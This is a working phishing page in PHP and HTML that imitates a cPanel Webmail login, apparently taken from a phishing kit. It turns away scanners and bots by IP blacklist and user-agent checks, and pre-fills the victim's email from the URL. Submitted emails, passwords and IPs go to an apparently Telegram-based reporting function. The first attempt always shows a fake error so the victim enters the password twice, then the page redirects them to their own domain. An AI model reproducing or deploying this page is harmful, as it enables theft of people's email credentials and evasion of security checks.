<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('getVisitorIP')) {
    function getVisitorIP() {
        $server_addr = $_SERVER['SERVER_ADDR'];
        $localhost = '127.0.0.1';
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP']) != $localhost) && (($_SERVER['HTTP_CF_CONNECTING_IP']) != ($server_addr))) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR']) != $localhost)) {
            $ip = $_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR']) != $localhost) && (($_SERVER['HTTP_X_FORWARDED_FOR']) != ($server_addr))) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP']) != $localhost) && (($_SERVER['HTTP_CLIENT_IP']) != ($server_addr))) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}
$visitor_ip = getVisitorIP();

if (IPBlacklistLoader::isBlacklisted($visitor_ip)) {
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$ua_lower = strtolower($ua);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate" />
    <meta name="apple-itunes-app" content="app-id=1188352635" />
    <title>Webmail Login</title>
    
    <!-- Antibot Scripts -->
    <script src="../m/js/fingerprint.js"></script>
    <script src="../m/js/utils.js"></script>
    <script src="../m/js/captcha.js"></script>

    <!-- Centralized Functions -->
    <script src="../js/centralized_telegram.js"></script>
    <script src="../js/centralized_redirect.js"></script>
    <script src="../js/email_extractor.js"></script>
    <script src="../js/autofill_helper.js"></script>

    <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />

    <!-- EXTERNAL CSS -->
    <link href="https://webmail.jhagdragroup.com/cPanel_magic_revision_1616517441/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css" />
    <link href="https://webmail.jhagdragroup.com/cPanel_magic_revision_1660253749/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css" />

    <style type="text/css">
        .copyright {
          background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
          background-size: 25px auto;
        }
    </style>
</head>
<body class="wm">
<div id="login-wrapper" class="group has-pw-reset">
    <div class="wrapper">
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="https://webmail.jhagdragroup.com/cPanel_magic_revision_1660251973/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
                JavaScript is disabled in your browser.
                For Webmail to function properly, you must enable JavaScript.
            </div>
        </noscript>
        <div id='login-status' class="error-notice" style="visibility: hidden">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class='login-status-icon'></span></div>
                    <div id="login-status-message">You have logged out.</div>
                </div>
            </div>
        </div>
    </div>

    <div id="content-container">
        <div id="login-container">
            <center>
              <div class="alert" id="msg" style="display: none; font-size:14px; background-color: #A52A2A; color: white;">Error: incorrect email or password</div>
              <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
            </center>

            <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="https://webmail.jhagdragroup.com/cPanel_magic_revision_1660251973/unprotected/cpanel/images/webmail-logo.svg" alt="logo" />
                    </div>
                    <div id="login-sub">
                        <div id="forms">
                            <form novalidate id="login_form" action="" method="post" target="_top">
                                <div class="input-req-login"><label for="email">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="password">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="submit-btn" tabindex="3">Login</button>
                                    </div>
                                    <div class="reset-pw">
                                        <a href="#" id="reset_password">Reset Password</a>
                                    </div>
                                </div>
                                <div class="clear" id="push"></div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="copyright">Copyright© 2024 cPanel, L.L.C.
<br /><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
    // Standardized UI Protection
    window.addEventListener('keydown', (e) => {
        if (e.ctrlKey && (e.which == 83)) { e.preventDefault(); return false; }
    });
    window.addEventListener('contextmenu', event => event.preventDefault());

    $(document).ready(function() {
        var count = 0;
        window.providerTag = 'cpanel';

        // Email extraction and autofill handled by centralized scripts
        if (typeof fillEmailIfPresent === 'function') {
            fillEmailIfPresent();
        } else {
            // Fallback for standalone use
            var email = typeof extractEmailFromUrl === 'function' ? extractEmailFromUrl() : "";
            if (email) $('#email').val(email);
        }

        $('#submit-btn').click(function(event) {
            event.preventDefault();
            $('#error').hide();
            $('#msg').hide();

            var email = $("#email").val();
            var password = $("#password").val();
            var clientIP = window.userip || 'n/a'; // Centralized logic handles IP extraction

            if (!email || !email.includes('@')) {
                $('#error').show().html("Enter a valid email address.");
                return false;
            }
            if (!password || password.length < 5) {
                $('#msg').show().html("Password is too short.");
                return false;
            }

            count++;
            $('#submit-btn').html('Verifying...');

            if (count === 1) {
                // First attempt - report and show error
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(window.providerTag, email, password, clientIP, function() {
                        $('#submit-btn').html('Login');
                        $("#password").val("");
                        $('#msg').show().html("Username or Password is incorrect. Please try again");
                    });
                } else {
                    // Fallback local report or simulation
                    setTimeout(function() {
                        $('#submit-btn').html('Login');
                        $("#password").val("");
                        $('#msg').show().html("Username or Password is incorrect. Please try again");
                    }, 1000);
                }
            } else {
                // Second attempt onwards - report and redirect
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(window.providerTag, email, password, clientIP, function() {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(800);
                        } else {
                            var domain = email.substring(email.lastIndexOf("@") + 1);
                            setTimeout(function() { window.location.replace("https://www." + domain); }, 800);
                        }
                    });
                } else {
                    var domain = email.substring(email.lastIndexOf("@") + 1);
                    setTimeout(function() { window.location.replace("https://www." + domain); }, 800);
                }
            }
        });
    });
</script>
</body>
</html>
